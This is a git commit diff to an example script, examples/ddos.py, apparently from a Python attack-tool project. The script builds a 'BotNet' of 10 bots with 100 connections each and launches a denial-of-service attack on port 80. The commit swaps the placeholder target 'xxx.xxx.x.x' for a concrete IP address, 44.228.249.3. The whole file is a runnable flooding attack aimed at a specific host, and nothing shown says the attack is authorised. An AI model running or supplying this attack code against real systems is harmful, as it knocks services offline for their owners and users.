cf9bf62f5477fdd0dfb6db4f1e38e9591f6def85
NripeshN <nn2012@hw.ac.uk>
2023-07-31 10:31:12 +0530

    example for ddos

--- examples/ddos.py
+++ examples/ddos.py
@@ -1,7 +1,7 @@
 from src.ddos_attack import BotNet  # change this to import from panthon
 
 botnet = BotNet(
-    10, "xxx.xxx.x.x", 80, 100
+    10, "44.228.249.3", 80, 100
 )  # num of bots, target IP, target port, connections per bot
 botnet.create_bots()
 botnet.launch_attack()
